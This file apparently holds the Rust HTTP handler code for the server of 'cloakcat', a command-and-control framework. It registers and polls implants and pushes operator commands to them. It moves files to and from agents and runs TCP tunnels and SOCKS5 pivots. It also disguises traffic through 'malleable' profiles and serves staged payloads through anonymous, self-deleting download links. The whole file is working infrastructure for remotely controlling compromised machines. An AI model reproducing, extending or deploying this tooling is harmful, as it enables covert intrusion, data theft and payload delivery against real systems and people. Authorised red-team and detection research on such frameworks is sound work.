//! Thin HTTP handlers — extract params, delegate to service, format response.

use axum::{
    body::Bytes,
    extract::{OriginalUri, Path, Query, State},
    http::{HeaderMap, StatusCode},
    response::IntoResponse,
    Json,
};
use serde::{Deserialize, Serialize};

use cloakcat_protocol::{FileChunk, PollResponse, SocksListenerView, TaskType, TunnelData};

use crate::config::ListenerEntry;
use crate::state::StagedPayload;
use crate::error::ServerError;
use crate::service;
use crate::state::AppState;
use crate::validation::validate_profile;

// ========== Request/Query types ==========

#[derive(Deserialize)]
pub struct PushCmdReq {
    pub command: String,
    #[serde(default)]
    pub task_type: TaskType,
}

#[derive(Deserialize)]
pub struct UploadChunkReq {
    pub transfer_id: String,
    pub path: String,
    pub seq: u32,
    pub total: u32,
    /// Base64-encoded chunk bytes.
    pub data: String,
}

#[derive(Deserialize)]
pub struct UpdateAliasReq {
    pub alias: Option<String>,
    pub note: Option<String>,
}

#[derive(Deserialize)]
pub struct HoldParam {
    pub hold: Option<u64>,
}

#[derive(Deserialize)]
pub struct TunnelRecvQuery {
    pub tunnel_id: u32,
    pub hold: Option<u64>,
}

#[derive(Deserialize)]
pub struct SocksStartReq {
    pub agent_id: String,
    pub port: u16,
}

#[derive(Deserialize)]
pub struct SocksStopReq {
    pub agent_id: String,
}

#[derive(Deserialize)]
pub struct ListResults {
    pub agent_id: Option<String>,
    pub limit: Option<usize>,
}

#[derive(Deserialize)]
pub struct ListAudit {
    pub actor: Option<String>,
    pub agent_id: Option<String>,
    pub limit: Option<i64>,
}

#[derive(Deserialize)]
pub struct TagsPayload {
    #[serde(default)]
    pub tags: Vec<String>,
}

// ========== Malleable transform helpers ==========

/// Decode a raw request body using the malleable profile matched to `uri`.
/// Falls back to plain JSON parsing when no transform is active.
fn decode_body<T: serde::de::DeserializeOwned>(
    state: &AppState,
    bytes: &Bytes,
    uri: &str,
) -> Result<T, ServerError> {
    let raw: Vec<u8> = match state.profile_for_uri(uri) {
        Some(profile) if !profile.http_post.client.output.is_identity() => {
            let s = std::str::from_utf8(bytes)
                .map_err(|_| ServerError::BadRequest("request body is not valid UTF-8".into()))?;
            profile
                .decode_post_body(s)
                .map_err(|e| ServerError::BadRequest(format!("body transform failed: {e}")))?
        }
        _ => bytes.to_vec(),
    };
    serde_json::from_slice(&raw)
        .map_err(|e| ServerError::BadRequest(format!("JSON parse failed: {e}")))
}

/// Encode a poll response using the malleable profile matched to `uri`.
/// Returns a plain `axum::response::Response` so the caller can return it directly.
fn encode_poll(state: &AppState, resp: &PollResponse, uri: &str) -> axum::response::Response {
    let json = match serde_json::to_vec(resp) {
        Ok(j) => j,
        Err(e) => {
            return (
                StatusCode::INTERNAL_SERVER_ERROR,
                Json(serde_json::json!({"status": "serialize_error", "detail": e.to_string()})),
            )
                .into_response();
        }
    };

    if let Some(profile) = state.profile_for_uri(uri) {
        let transform = &profile.http_get.server.output;
        if !transform.is_identity() {
            match transform.encode(&json) {
                Ok(encoded) => {
                    let mut builder = axum::http::Response::builder()
                        .status(StatusCode::OK)
                        .header("Content-Type", "text/plain");
                    // Inject custom server headers from the profile.
                    for h in &profile.http_get.server.headers {
                        builder = builder.header(h.name.as_str(), h.value.as_str());
                    }
                    if let Ok(response) = builder.body(axum::body::Body::from(encoded)) {
                        return response;
                    }
                }
                Err(e) => {
                    eprintln!("[poll] malleable encode failed: {e}");
                    // Fall through to plain JSON below.
                }
            }
        }
    }

    (StatusCode::OK, Json(resp.clone())).into_response()
}

// ========== Agent routes (X-Agent-Token validated by agent_auth middleware) ==========

pub async fn ping_handler() -> &'static str {
    "pong"
}

pub async fn register_handler(
    OriginalUri(uri): OriginalUri,
    headers: HeaderMap,
    State(state): State<AppState>,
    body: Bytes,
) -> Result<Json<serde_json::Value>, ServerError> {
    let payload: cloakcat_protocol::RegisterReq = decode_body(&state, &body, uri.path())?;

    // If agent already exists, validate profile match.
    if let Ok(agent) = service::get_agent(&state, &payload.agent_id).await {
        validate_profile(agent.profile_name.as_deref(), uri.path(), &headers, &state.profiles)?;
    }

    let resp = service::register_agent(&state, &payload).await?;
    Ok(Json(resp))
}

pub async fn poll_handler(
    Path(agent_id): Path<String>,
    OriginalUri(uri): OriginalUri,
    headers: HeaderMap,
    State(state): State<AppState>,
    Query(q): Query<HoldParam>,
) -> Result<impl IntoResponse, ServerError> {
    let agent = service::get_agent(&state, &agent_id).await?;
    validate_profile(agent.profile_name.as_deref(), uri.path(), &headers, &state.profiles)?;

    let hold = q.hold.unwrap_or(0);
    match service::poll_command(&state, &agent_id, hold).await? {
        Some(resp) => Ok(encode_poll(&state, &resp, uri.path())),
        None => Ok((StatusCode::NO_CONTENT, Json(serde_json::json!({}))).into_response()),
    }
}

pub async fn result_handler(
    Path(agent_id): Path<String>,
    OriginalUri(uri): OriginalUri,
    headers: HeaderMap,
    State(state): State<AppState>,
    body: Bytes,
) -> Result<Json<serde_json::Value>, ServerError> {
    let req: cloakcat_protocol::ResultReq = decode_body(&state, &body, uri.path())?;

    let agent = service::get_agent(&state, &agent_id).await?;
    validate_profile(agent.profile_name.as_deref(), uri.path(), &headers, &state.profiles)?;

    service::submit_result(&state, &agent, &req).await?;
    Ok(Json(serde_json::json!({ "status": "ok" })))
}

// ========== Protected (operator) routes ==========

pub async fn admin_agents(
    State(state): State<AppState>,
) -> Result<Json<Vec<cloakcat_protocol::AgentView>>, ServerError> {
    let agents = service::list_agents(&state).await?;
    Ok(Json(agents))
}

pub async fn admin_update_agent_alias(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Json(body): Json<UpdateAliasReq>,
) -> Result<Json<serde_json::Value>, ServerError> {
    let view = service::update_alias(
        &state,
        &agent_id,
        body.alias.as_deref(),
        body.note.as_deref(),
    )
    .await?;
    Ok(Json(serde_json::to_value(view).unwrap()))
}

pub async fn admin_results(
    State(state): State<AppState>,
    Query(q): Query<ListResults>,
) -> Result<Json<Vec<cloakcat_protocol::ResultView>>, ServerError> {
    let limit = q.limit.unwrap_or(20).min(200) as i64;
    let results = service::query_results(&state, q.agent_id.as_deref(), limit).await?;
    Ok(Json(results))
}

pub async fn admin_audit(
    State(state): State<AppState>,
    Query(q): Query<ListAudit>,
) -> Result<Json<Vec<crate::db::AuditRecord>>, ServerError> {
    let limit = q.limit.unwrap_or(50).max(1);
    let records = service::query_audit(
        &state,
        limit,
        q.actor.as_deref(),
        q.agent_id.as_deref(),
    )
    .await?;
    Ok(Json(records))
}

pub async fn admin_agent_tags(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
) -> Result<Json<serde_json::Value>, ServerError> {
    let tags = service::get_agent_tags(&state, &agent_id).await?;
    Ok(Json(serde_json::json!({ "tags": tags })))
}

pub async fn admin_set_agent_tags(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Json(body): Json<TagsPayload>,
) -> Result<Json<serde_json::Value>, ServerError> {
    let tags = service::set_agent_tags(&state, &agent_id, &body.tags).await?;
    Ok(Json(serde_json::json!({ "tags": tags })))
}

pub async fn push_command_handler(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Json(req): Json<PushCmdReq>,
) -> Result<Json<serde_json::Value>, ServerError> {
    service::push_command(&state, &agent_id, &req.command, req.task_type).await?;
    Ok(Json(serde_json::json!({ "status": "ok" })))
}

// ========== Transfer routes (operator-facing) ==========

/// POST /v1/transfer/upload-chunk/{agent_id} — CLI sends a file chunk to server.
pub async fn upload_chunk_handler(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Json(req): Json<UploadChunkReq>,
) -> Result<Json<serde_json::Value>, ServerError> {
    let complete = service::receive_upload_chunk(
        &state,
        &agent_id,
        &req.transfer_id,
        &req.path,
        req.seq,
        req.total,
        &req.data,
    )
    .await?;
    Ok(Json(serde_json::json!({ "status": "ok", "complete": complete })))
}

/// GET /v1/transfer/download-result/{transfer_id} — CLI polls for assembled download.
/// Returns 200 + raw bytes when ready, 202 when still in progress.
pub async fn get_download_handler(
    Path(transfer_id): Path<String>,
    State(state): State<AppState>,
) -> Result<impl IntoResponse, ServerError> {
    match service::get_download_bytes(&state, &transfer_id).await? {
        Some(bytes) => Ok((StatusCode::OK, Bytes::from(bytes)).into_response()),
        None => Ok((StatusCode::ACCEPTED, Json(serde_json::json!({ "status": "pending" }))).into_response()),
    }
}

// ========== Transfer routes (agent-facing) ==========

/// GET /v1/transfer/upload-file/{transfer_id} — agent fetches assembled upload file.
pub async fn get_upload_file_handler(
    Path(transfer_id): Path<String>,
    State(state): State<AppState>,
) -> Result<impl IntoResponse, ServerError> {
    let bytes = service::get_upload_bytes(&state, &transfer_id).await?;
    Ok((StatusCode::OK, Bytes::from(bytes)).into_response())
}

/// POST /v1/transfer/download-chunk/{agent_id} — agent sends a download chunk.
pub async fn download_chunk_handler(
    Path(_agent_id): Path<String>,
    State(state): State<AppState>,
    Json(chunk): Json<FileChunk>,
) -> Result<Json<serde_json::Value>, ServerError> {
    let complete = service::receive_download_chunk(&state, &chunk).await?;
    Ok(Json(serde_json::json!({ "status": "ok", "complete": complete })))
}

// ========== Tunnel routes (agent-facing) ==========

/// GET /v1/tunnel/recv/{agent_id}?tunnel_id={id}&hold={secs}
/// Agent polls for data to relay to its local TCP target.
pub async fn tunnel_recv_handler(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Query(q): Query<TunnelRecvQuery>,
) -> Result<impl IntoResponse, ServerError> {
    let hold = q.hold.unwrap_or(0);
    match service::recv_tunnel_data(&state, &agent_id, q.tunnel_id, hold).await? {
        Some(frame) => Ok((StatusCode::OK, Json(frame)).into_response()),
        None => Ok((StatusCode::NO_CONTENT, Json(serde_json::json!({}))).into_response()),
    }
}

/// POST /v1/tunnel/send/{agent_id} — agent sends data from its local TCP target.
pub async fn tunnel_send_handler(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Json(frame): Json<TunnelData>,
) -> Result<Json<serde_json::Value>, ServerError> {
    service::send_tunnel_data(&state, &agent_id, frame).await?;
    Ok(Json(serde_json::json!({ "status": "ok" })))
}

// ========== SOCKS5 management (operator-facing) ==========

/// POST /v1/admin/socks/start — start a SOCKS5 listener for an agent.
pub async fn socks_start_handler(
    State(state): State<AppState>,
    Json(req): Json<SocksStartReq>,
) -> Result<Json<serde_json::Value>, ServerError> {
    service::socks_start(&state, &req.agent_id, req.port).await?;
    Ok(Json(serde_json::json!({ "status": "ok", "port": req.port })))
}

/// POST /v1/admin/socks/stop — stop the SOCKS5 listener for an agent.
pub async fn socks_stop_handler(
    State(state): State<AppState>,
    Json(req): Json<SocksStopReq>,
) -> Result<Json<serde_json::Value>, ServerError> {
    service::socks_stop(&state, &req.agent_id).await?;
    Ok(Json(serde_json::json!({ "status": "ok" })))
}

/// GET /v1/admin/socks/list — list active SOCKS5 listeners.
pub async fn socks_list_handler(
    State(state): State<AppState>,
) -> Result<Json<Vec<SocksListenerView>>, ServerError> {
    let list = service::socks_list(&state).await?;
    Ok(Json(list))
}

// ========== Listener management (operator-facing) ==========

/// GET /v1/admin/listeners — list all active C2 listeners.
pub async fn admin_listeners_list(
    State(state): State<AppState>,
) -> Result<Json<Vec<ListenerEntry>>, ServerError> {
    let mgr = state.listener_mgr.lock().await;
    Ok(Json(mgr.list().into_iter().cloned().collect()))
}

/// POST /v1/admin/listeners — add and start a new C2 listener at runtime.
pub async fn admin_listeners_add(
    State(state): State<AppState>,
    Json(entry): Json<ListenerEntry>,
) -> Result<Json<serde_json::Value>, ServerError> {
    // Validate listener type early.
    if entry.listener_type != "http" && entry.listener_type != "https" {
        return Err(ServerError::BadRequest(format!(
            "unknown listener type {:?}; expected \"http\" or \"https\"",
            entry.listener_type
        )));
    }

    {
        let mgr = state.listener_mgr.lock().await;
        if mgr.contains(&entry.name) {
            return Err(ServerError::Conflict(format!(
                "listener '{}' already running",
                entry.name
            )));
        }
    }

    // Build a router wired to the current shared state.
    let app = crate::routes::build_router(state.clone())
        .layer(axum::extract::DefaultBodyLimit::max(2 * 1024 * 1024));

    let name = entry.name.clone();
    let cancel = match entry.listener_type.as_str() {
        "https" => {
            let cert_cfg = state
                .profiles
                .get(&entry.profile)
                .and_then(|p| p.https_certificate.as_ref());
            let cert_path = format!("config/certs/{}.pem", entry.profile);
            let key_path = format!("config/certs/{}_key.pem", entry.profile);
            let tls_config =
                crate::tls::ensure_rustls_config(&cert_path, &key_path, cert_cfg, &entry.profile)
                    .await
                    .map_err(ServerError::Internal)?;
            crate::listener_mgr::spawn_https(&entry, app, tls_config)
                .await
                .map_err(ServerError::Internal)?
        }
        _ => crate::listener_mgr::spawn_http(&entry, app)
            .await
            .map_err(ServerError::Internal)?,
    };

    state.listener_mgr.lock().await.insert(entry, cancel);
    Ok(Json(serde_json::json!({ "status": "ok", "name": name })))
}

/// DELETE /v1/admin/listeners/{name} — stop and remove a C2 listener.
pub async fn admin_listeners_remove(
    Path(name): Path<String>,
    State(state): State<AppState>,
) -> Result<Json<serde_json::Value>, ServerError> {
    let removed = state.listener_mgr.lock().await.remove(&name);
    if removed {
        Ok(Json(serde_json::json!({ "status": "ok", "name": name })))
    } else {
        Err(ServerError::NotFound)
    }
}

// ========== Staging (--host) ==========

#[derive(Deserialize)]
pub struct StageQuery {
    /// Delete after first download (default: true).
    #[serde(default = "bool_true")]
    pub one_shot: bool,
    /// Minutes until the payload expires (default: 60).
    #[serde(default = "default_expire_mins")]
    pub expire: u64,
}

fn bool_true() -> bool { true }
fn default_expire_mins() -> u64 { 60 }

#[derive(Serialize)]
pub struct StageResp {
    pub id: String,
    /// Relative download path: `/d/<id>`
    pub path: String,
}

/// POST /v1/admin/stage — upload a payload; returns an anonymous download ID.
pub async fn stage_upload_handler(
    State(state): State<AppState>,
    Query(q): Query<StageQuery>,
    body: Bytes,
) -> Result<Json<StageResp>, ServerError> {
    if body.is_empty() {
        return Err(ServerError::BadRequest("empty body".into()));
    }
    let id = uuid::Uuid::new_v4().to_string().replace('-', "");
    let expires_at =
        std::time::Instant::now() + std::time::Duration::from_secs(q.expire * 60);
    state.staging.lock().await.insert(
        id.clone(),
        StagedPayload { data: body.to_vec(), one_shot: q.one_shot, expires_at },
    );
    Ok(Json(StageResp { path: format!("/d/{}", id), id }))
}

/// GET /d/{id} — serve a staged payload (public, no auth).
pub async fn stage_download_handler(
    Path(id): Path<String>,
    State(state): State<AppState>,
) -> Result<impl IntoResponse, ServerError> {
    let mut store = state.staging.lock().await;
    let now = std::time::Instant::now();
    let data = match store.get(&id) {
        None => return Err(ServerError::NotFound),
        Some(p) if p.expires_at < now => {
            store.remove(&id);
            return Err(ServerError::NotFound);
        }
        Some(p) => {
            let data = p.data.clone();
            if p.one_shot {
                store.remove(&id);
            }
            data
        }
    };
    Ok((StatusCode::OK, [("content-type", "application/octet-stream")], data))
}
